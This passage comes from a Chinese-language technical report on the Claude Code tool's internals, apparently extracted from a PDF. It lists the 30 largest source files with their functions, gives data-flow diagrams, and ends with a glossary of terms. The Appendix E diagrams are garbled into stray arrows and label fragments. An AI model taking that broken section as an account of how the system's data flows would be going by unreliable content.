+主编排器、启动流程、模式
+选择
+7
+4,436
+utils/bash/bashParser.ts
+Bash命令解析器
+8
+3,997
+utils/attachments.ts
+文件附件处理
+9
+3,419
+services/api/claude.ts
+Claude API集成、错误恢复
+10
+3,348
+services/mcp/client.ts
+MCP客户端、连接管理
+11
+3,302
+utils/plugins/pluginLoader.ts
+插件加载器
+12
+3,200
+commands/insights.ts
+代码洞察分析
+13
+2,999
+bridge/bridgeMain.ts
+Bridge核心循环
+14
+2,679
+utils/bash/ast.ts
+Bash AST解析
+15
+2,643
+utils/plugins/marketplaceMana
+ger.ts
+市场管理器
+16
+2,621
+tools/BashTool/bashPermissio
+ns.ts
+Bash权限管理
+17
+2,592
+tools/BashTool/bashSecurity.ts
+Bash安全检查（25项）
+18
+2,578
+native-ts/yoga-layout/index.ts
+Yoga布局引擎（TS移植）
+19
+2,465
+services/mcp/auth.ts
+MCP认证
+20
+2,406
+bridge/replBridge.ts
+REPL Bridge协议
+21
+2,338
+components/PromptInput/Pro
+mptInput.tsx
+提示输入组件
+22
+2,214
+commands/plugin/ManagePlug
+ins.tsx
+插件管理界面
+23
+2,049
+tools/PowerShellTool/pathVali
+dation.ts
+PowerShell路径验证
+24
+2,002
+utils/auth.ts
+认证工具
+25
+1,990
+tools/BashTool/readOnlyValida
+tion.ts
+Bash只读验证
+26
+1,893
+utils/shell/readOnlyCommandV
+alidation.ts
+Shell只读命令验证
+
+--- Page 95 ---
+Claude Code 0331 系统报告
+附录D · 关键源文件索引（Top 30）
+—  95  —
+公众号：手工川
+2026-04-01
+排名
+行数
+文件路径
+功能描述
+27
+1,889
+entrypoints/sdk/coreSchemas.t
+s
+SDK核心Schema
+28
+1,823
+tools/PowerShellTool/readOnly
+Validation.ts
+PowerShell只读验证
+29
+1,821
+components/Settings/Config.ts
+x
+设置配置界面
+30
+1,817
+utils/config.ts
+配置工具
+代码库总行数：394,222行 TypeScript/TSX
+
+--- Page 96 ---
+Claude Code 0331 系统报告
+附录D · 关键源文件索引（Top 30）
+—  96  —
+公众号：手工川
+2026-04-01
+附录E · 数据流架构图
+核心数据流
+     →      →      → Claude API →      → UI   →    ↓ ↓ ↓ ↓ ↓ ↓           Token                  ↓
+↓ ↓ ↓ ↓ ↓ Hook                        KAIROS自主Agent数据流
+<tick>    →      →      →    →      ↓ ↓ Sleep   ←──────       ────────────    ──→    ↓ ↓
+Channel   ←──      ──→    ──→    ──→    ↓ PushNotification →     记忆系统数据流
+     → Session Memory   10K token   →      ↓      → AutoDream 24h+5     → Memory   ↓      →
+Magic Docs   → Sonnet Agent   →      ↓ Memory   → Team Sync →      →   API →     Bridge远程控制数据流
+       /Web/CI  ↓ Work   → Bridge Loop → Spawn   → Claude CLI   ↓ ↓ JWT   → REPL Bridge ←
+WebSocket →      ↓ ↓      →    UI ←    →       
+
+--- Page 97 ---
+Claude Code 0331 系统报告
+附录E · 数据流架构图
+—  97  —
+公众号：手工川
+2026-04-01
+附录F · 术语表
+术语
+英文
+定义
+特性标志
+Feature Flag
+编译时或运行时控制功能启用/禁用的开
+关
+编译时消除
+Dead Code Elimination
+打包时移除未启用特性的代码
+缓存断点
+Cache Breakpoint
+在消息历史中标记的位置，允许后续请
+求复用之前的计算
+微压缩
+Micro-Compaction
+基于文件路径索引的精确上下文压缩
+响应式压缩
+Reactive Compaction
+在上下文接近满载时触发的自动压缩
+Snip压缩
+Snip Compaction
+用摘要替换长工具输出
+Forked Agent
+Forked Agent
+共享父Agent的prompt
+cache的后台子Agent
+Tick
+Tick
+KAIROS的周期性心跳信号
+Dream
+Dream
+AI的自动记忆巩固过程
+Bridge
+Bridge
+CLI实例与外部系统之间的远程控制桥接
+Worktree
+Git Worktree
+Git仓库的独立工作副本，用于Agent隔
+离
+MCP
+Model Context Protocol
+模型上下文协议，用于LLM与外部服务
+通信
+DXT
+DXT
+Claude Code的插件打包格式
+Memdir
+Memory Directory
+持久化记忆文件的目录结构
+Magic Docs
+Magic Documents
+AI自动维护的特殊标记文档
+Team Memory Sync
+Team Memory Sync
+跨团队成员的记忆同步机制
+KAIROS
+KAIROS
+自主助手模式（希腊语"恰当的时机"）
+Coordinator
+Coordinator
+多Agent编排器（Leader-Worker架构）
+Swarm
+Swarm
+对等协作的Agent群组
+InProcessTeammate
+In-Process Teammate
+进程内的轻量级队友Agent
+NDJSON
+Newline-Delimited JSON
+以换行分隔的JSON流格式
+PKCE
+Proof Key for Code Exchange
+OAuth 2.0安全扩展
+GrowthBook
+GrowthBook
+特性标志和A/B测试平台
+BiDi
+Bidirectional Text
+Unicode双向文本算法
+DECSTBM
+DEC Set Top Bottom Margin
+终端硬件滚动指令
+Yoga
+Yoga Layout
+Facebook开发的跨平台Flexbox布局引擎
+Ink
+Ink
+基于React的终端UI框架
+Bun
+Bun
+高性能JavaScript/TypeScript运行时
+
+--- Page 98 ---
+Claude Code 0331 系统报告
+附录F · 术语表
+—  98  —
+公众号：手工川
+2026-04-01
+术语
+英文
+定义
+TCC
+Transparency, Consent, Control
+macOS隐私权限管理框架
+
+--- Page 99 ---
+本报告仅用于学术研究和技术讨论
+© 2026 公众号：手工川
